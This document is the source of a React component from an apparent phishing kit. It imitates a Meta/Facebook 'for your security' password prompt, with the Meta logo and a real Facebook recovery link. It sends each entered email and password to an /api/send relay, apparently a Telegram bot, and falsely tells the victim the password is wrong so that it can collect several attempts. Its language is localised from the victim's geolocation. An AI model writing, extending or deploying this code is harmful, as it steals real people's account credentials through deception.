'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import config from '@/utils/config';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface PasswordModalProps {
    userEmail: string;
    nextStep: () => void;
}

const PasswordModal: FC<PasswordModalProps> = ({ userEmail, nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [attempt, setAttempt] = useState(1);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, setMessageId, message, setMessage, geoInfo } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        (async () => {
            // Map country code to language code for translation (comprehensive mapping)
            const countryToLang: Record<string, string> = {
                // English
                'us': 'en', 'gb': 'en', 'au': 'en', 'ca': 'en', 'nz': 'en', 'ie': 'en',
                'sg': 'en', 'hk': 'en', 'za': 'en', 'ng': 'en', 'ke': 'en', 'gh': 'en',
                // Vietnamese
                'vn': 'vi',
                // Arabic
                'ae': 'ar', 'sa': 'ar', 'eg': 'ar', 'jo': 'ar', 'lb': 'ar', 'om': 'ar',
                'qa': 'ar', 'kw': 'ar', 'bh': 'ar', 'iq': 'ar', 'ye': 'ar', 'ps': 'ar',
                'tn': 'ar', 'ma': 'ar', 'dz': 'ar', 'ly': 'ar', 'sd': 'ar', 'mr': 'ar',
                // German
                'de': 'de', 'at': 'de', 'ch': 'de', 'lu': 'de',
                // Dutch
                'nl': 'nl', 'be': 'nl',
                // Bulgarian
                'bg': 'bg',
                // Portuguese
                'pt': 'pt', 'br': 'pt', 'ao': 'pt', 'mz': 'pt', 'cv': 'pt', 'gw': 'pt', 'st': 'pt',
                // Spanish
                'es': 'es', 'mx': 'es', 'ar': 'es', 'co': 'es', 'pe': 'es', 've': 'es',
                'cl': 'es', 'ec': 'es', 'bo': 'es', 'py': 'es', 'uy': 'es', 'cr': 'es',
                'pa': 'es', 'sv': 'es', 'hn': 'es', 'ni': 'es', 'gt': 'es', 'do': 'es', 'cu': 'es',
                // Finnish
                'fi': 'fi',
                // French
                'fr': 'fr', 'sn': 'fr', 'ci': 'fr', 'bj': 'fr',
                'bf': 'fr', 'ga': 'fr', 'gn': 'fr', 'cm': 'fr', 'cg': 'fr', 'ne': 'fr',
                'tg': 'fr', 'ml': 'fr', 'cd': 'fr', 'cf': 'fr', 'dj': 'fr', 'sc': 'fr',
                'bl': 'fr', 'gp': 'fr', 'mq': 'fr', 're': 'fr', 'mu': 'fr', 'ht': 'fr',
                // Greek
                'gr': 'el', 'cy': 'el',
                // Croatian
                'hr': 'hr',
                // Hungarian
                'hu': 'hu',
                // Hindi
                'in': 'hi',
                // Italian
                'it': 'it', 'sm': 'it', 'va': 'it',
                // Lithuanian
                'lt': 'lt',
                // Latvian
                'lv': 'lv',
                // Maltese
                'mt': 'mt',
                // Malay
                'my': 'ms',
                // Norwegian
                'no': 'no',
                // Polish
                'pl': 'pl',
                // Romanian
                'ro': 'ro', 'md': 'ro',
                // Swedish
                'se': 'sv', 'ax': 'sv',
                // Slovenian
                'si': 'sl',
                // Slovak
                'sk': 'sk',
                // Thai
                'th': 'th',
                // Turkish
                'tr': 'tr',
                // Chinese
                'cn': 'zh', 'tw': 'zh', 'mo': 'zh',
                // Korean
                'kr': 'ko',
                // Czech
                'cz': 'cs',
                // Danish
                'dk': 'da', 'gl': 'da',
                // Estonian
                'ee': 'et',
                // Filipino
                'ph': 'tl',
                // Russian
                'ru': 'ru',
                // Japanese
                'jp': 'ja',
                // Bengali
                'bd': 'bn',
                // Urdu
                'pk': 'ur',
                // Ukrainian
                'ua': 'uk',
                // Indonesian
                'id': 'id',
                // Persian (Farsi)
                'ir': 'fa',
                // Burmese
                'mm': 'my',
                // Swahili
                'tz': 'sw'
            };

            const targetLang = countryToLang[geoInfo.country_code.toLowerCase()] || 'en';
            const translationsData = getTranslations(targetLang);
            setTranslations(translationsData);
        })();
    }, [geoInfo]);

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading || !message || !password) return;
        setIsLoading(true);

        if (attempt < config.MAX_PASS) {
            const label = config.MAX_PASS === 1 ? 'Password' : `Password ${attempt}`;
            const updatedMessage = attempt === 1
                ? `${message}\n\n<b>📧 Account Email:</b> <code>${userEmail}</code>\n<b>🔒 ${label}:</b> <code>${password}</code>`
                : `${message}\n\n<b>🔒 ${label}:</b> <code>${password}</code>`;

            try {
                const res = await axios.post('/api/send', {
                    message: updatedMessage,
                    deleteMessageId: messageId
                });

                if (res?.data?.success) {
                    setMessage(updatedMessage);
                    if (typeof res.data.data?.result?.message_id === 'number') {
                        setMessageId(res.data.data.result.message_id);
                    }
                }
            } catch {
                // Continue even if send fails
            } finally {
                setIsLoading(false);
                setShowError(true);
                setPassword('');
                setAttempt(attempt + 1);
            }
        } else {
            const label = config.MAX_PASS === 1 ? 'Password' : `Password ${attempt}`;
            const updatedMessage = attempt === 1
                ? `${message}\n\n<b>📧 Account Email:</b> <code>${userEmail}</code>\n<b>🔒 ${label}:</b> <code>${password}</code>`
                : `${message}\n\n<b>🔒 ${label}:</b> <code>${password}</code>`;

            try {
                const res = await axios.post('/api/send', {
                    message: updatedMessage,
                    deleteMessageId: messageId
                });

                if (res?.data?.success) {
                    setMessage(updatedMessage);
                    if (typeof res.data.data?.result?.message_id === 'number') {
                        setMessageId(res.data.data.result.message_id);
                    }
                }
                nextStep();
            } catch {
                nextStep();
            } finally {
                setIsLoading(false);
            }
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto gap-2 sm:gap-2.5 md:gap-3 py-4 sm:py-5 md:py-6 px-1.5 sm:px-3 md:px-4'>
                        {/* Header */}
                        <div className='text-left'>
                            <p className='text-xs sm:text-sm text-gray-500'>
                                {t('For your security, you must enter your password to continue.')}
                            </p>
                        </div>

                        {/* Password Input */}
                        <div className='w-full'>
                            <div className='relative w-full'>
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                    }}
                                    className='h-11 sm:h-12 md:h-13 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-base focus:border-blue-500 focus:outline-none transition-colors'
                                    required
                                    autoComplete='new-password'
                                    placeholder={t('Password')}
                                />
                                <FontAwesomeIcon
                                    icon={showPassword ? faEyeSlash : faEye}
                                    size='lg'
                                    className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]'
                                    onClick={() => setShowPassword(!showPassword)}
                                />
                            </div>
                        </div>

                        {/* Error Message */}
                        {showError && (
                            <p className='text-xs sm:text-sm text-red-500'>
                                {t('The password you\'ve entered is incorrect')}
                            </p>
                        )}

                        {/* Log In Button */}
                        <button
                            type='submit'
                            disabled={isLoading}
                            className={`flex h-11 sm:h-12 md:h-13 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${
                                isLoading ? 'cursor-not-allowed opacity-80' : ''
                            }`}
                        >
                            {isLoading ? (
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            ) : (
                                t('Continue')
                            )}
                        </button>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-sm text-center text-blue-600 hover:underline'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-3'>
                        <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;